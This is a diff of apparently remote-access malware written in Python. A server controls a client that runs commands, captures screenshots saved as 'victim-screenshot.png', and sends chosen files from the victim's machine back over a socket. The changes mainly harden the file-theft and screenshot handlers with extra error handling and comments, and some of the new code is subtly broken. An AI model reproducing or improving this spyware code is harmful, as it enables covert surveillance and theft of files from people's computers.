@@ -9,6 +9,7 @@ import subprocess
 import os
 import select
 import signal
+# All the libraries are build in with python, except the 'pyscreenshot', that is why we try to install it.
 try:
     import pyscreenshot
 except:
@@ -31,16 +32,18 @@ class Server():
     def __init__(self):
         # This socket is for creating connection with client, after the connection, all the commands of the Command Line will be send with this socket
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # With this socket we check the connecton between client and server
         self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 
         # We stop the threads using boolean variables, indeed we break the loop of the function  
-        self.is_client_connected = False
-        self.is_server_listening = False
-
         self.recv_out_put_bool = True
         self.accept_client_bool = True
         self.capture_ping_bool = True
+
+        # If the user, from other pages(ex.Command Line) wants to return
+        self.is_client_connected = False
+        self.is_server_listening = False
 
         self.client_ping = None
         self.client = None
@@ -191,26 +194,32 @@ class Server():
                                 self.client.sendall(b'ok')
                             subprocess.run(['xdg-open', 'victim-screenshot.png'])
                         except:
-                            run_login.run_server.output_list.insert(tk.END, "can't screenshot")
+                            pass
                         if data == "not ok":
                             run_login.run_server.output_list.insert(tk.END, "can't screenshot")
 
                     elif self.output == "showfile--*#($)&":
                         self.client.sendall(b'ok')
                         data = self.client.recv(1024).decode()
-                        self.file_name, self.file_size = data.split('|')
-                        self.file_size = int(self.file_size)
-                        self.client.sendall(b'ok')
-
-                        with open(f"recv-{self.file_name}", 'wb') as file:
-                            while self.file_size > 0:
-                                data = self.client.recv(min(self.file_size, 4096))
-                                file.write(data)
-                                self.file_size -= len(data)
-                                if not data:
-                                    break
+                        if data != b'not ok':
+                            self.file_name, self.file_size = data.split('|')
+                            self.file_size = int(self.file_size)
                             self.client.sendall(b'ok')
-                        subprocess.run(['xdg-open', f"recv-{self.file_name}"])
+
+                            with open(f"recv-{self.file_name}", 'wb') as file:
+                                while self.file_size > 0:
+                                    data = self.client.recv(min(self.file_size, 4096))
+                                    file.write(data)
+                                    self.file_size -= len(data)
+                                    if not data:
+                                        break
+                                self.client.sendall(b'ok')
+                            subprocess.run(['xdg-open', f"recv-{self.file_name}"])
+                        else:
+                            e = self.client.recv(1024).decode()
+                            run_login.run_server.output_list.insert(tk.END, e)
+                            run_login.run_server.output_list.yview(tk.END)
+
 
                     else:
                         self.output_lines = self.output.split('\n')
@@ -380,24 +389,29 @@ class Client():
                             self.client_socket.send("showfile--*#($)&".encode())
                             self.client_socket.recv(1024)
 
-                            self.file_name = self.command[9:]        
-                            self.file_size = os.path.getsize(self.file_name)
-                            
-                            self.client_socket.send(f"{self.file_name}|{self.file_size}".encode())
-                            self.msg = self.client_socket.recv(1024)
-                            if self.msg == b'ok':
-                                try:
-                                    file = open(self.file_name, 'rb')
-                                    data = file.read()
-                                except:
-                                    self.client_socket.send("could not open the file!".encode())
-                                try:
-                                    self.client_socket.sendall(data)
-                                    self.client_socket.recv(1024)
-                                except:
-                                    self.client_socket.send("could not send data!".encode())
-                            else:
-                                raise Exception('client did not recieved file name and size')
+                            self.file_name = self.command[9:]
+                            try:      
+                                self.file_size = os.path.getsize(self.file_name)
+                                
+                                self.client_socket.send(f"{self.file_name}|{self.file_size}".encode())
+                                self.msg = self.client_socket.recv(1024)
+                                if self.msg == b'ok':
+                                    try:
+                                        file = open(self.file_name, 'rb')
+                                        data = file.read()
+                                    except:
+                                        self.client_socket.send("could not open the file!".encode())
+                                    try:
+                                        self.client_socket.sendall(data)
+                                        self.client_socket.recv(1024)
+                                    except:
+                                        self.client_socket.send("could not send data!".encode())
+                                else:
+                                    pass
+                            except Exception as e:
+                                self.client_socket.sendall(b'not ok')
+                                self.client_socket.send(e.encode())
+                                
 
                                 
                         else:
